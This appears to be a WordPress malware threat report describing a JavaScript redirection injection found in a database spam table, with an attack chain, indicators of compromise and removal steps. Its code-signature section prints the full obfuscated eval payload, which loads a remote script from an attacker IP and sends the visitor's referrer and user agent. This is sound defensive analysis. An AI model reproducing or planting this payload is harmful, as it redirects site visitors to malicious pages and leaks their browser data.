---
title: 'JavaScript Redirection Injection'
slug: 'javascript-redirection-injection'
reportDate: '2026-01-24'
threatType: 'Redirection Malware'
severity: 'High'
fileHash: 'db-malware'
detectedPaths: ['malware-sample.txt']
screenshots:
  [
    '/images/wordpress-threats/db-malware_evidence-1.png',
    '/images/wordpress-threats/db-malware_evidence-2.png',
  ]
vtLink: 'https://www.virustotal.com/gui/home/upload'
vtScore: 'Zero-Day (Unique)'
impact: 'The malware causes SEO reputation damage and user experience degradation by redirecting users to potentially dangerous websites. It also poses a significant security risk by allowing attackers to control user redirection.'
seenOn: 'Database (specifically in a spam table)'
behavior: 'Redirects users to malicious sites.'
difficulty: 'Moderate'
recurrence: 'Medium'
numberOfSiteFixed: 'Not specified in the user notes'
---

## Technical Analysis

This malware is a JavaScript-based redirection attack identified within a spam table in the database, as mentioned by the user. The code uses an obfuscated eval function to inject a script tag that redirects users to a malicious external URL. It manipulates the document object to write this script dynamically, allowing attackers to potentially hijack traffic and direct it to phishing or malicious sites. The location in the database spam table suggests it may have been injected through a vulnerable plugin or theme form.

> **VirusTotal Analysis:** 🛡️ **Zero-Day / Fully Undetected.**

## Attack Chain

1. Step 1: Malware is injected into the database, specifically within a table associated with spam or phishing submissions.
2. Step 2: When the page loads, the obfuscated JavaScript code executes, decoding itself using the eval function.
3. Step 3: The script writes an iframe or redirect into the document, which then redirects users to the attacker's specified URL.

## Code Signature(s)

### FILE: `malware-sample.js`

```js
<noindex><script id="wpinfo-pst1" type="text/javascript" rel="nofollow">eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\b'+e(c)+'\b','g'),k[c])}}return p}('0.6("<a g=\'2\' c=\'d\' e=\'b/2\' 4=\'7://5.8.9.f/1/h.s.t?r="+3(0.p)+"\o="+3(j.i)+"\'><\/k"+"l>");n m="q";',30,30,'document||javascript|encodeURI|src||write|http|45|67|script|text|rel|nofollow|type|97|language|jquery|userAgent|navigator|sc|ript|zasti|var|u0026u|referrer|fsikh||js|php'.split('|'),0,{}))
</script></noindex>
```

## Indicators of Compromise (IOCs)

- `wpinfo-pst1`
- `45.67.97`
- `zasti`
- `fsikh`
- `http://45.67.97`

## Removal Protocol

1. Step 1: Backup your website files and database.
1. Step 2: Access the database via phpMyAdmin and locate the spam table.
1. Step 3: Identify and remove any malicious scripts or entries in this table similar to the captured code.
1. Step 4: Check all themes and plugins for vulnerabilities and update or replace them if needed.
1. Step 5: Implement a website firewall or security plugin to prevent future injections.

> **Status:** Active Threat.  
> **Verification:** Verified by MD Pabel.
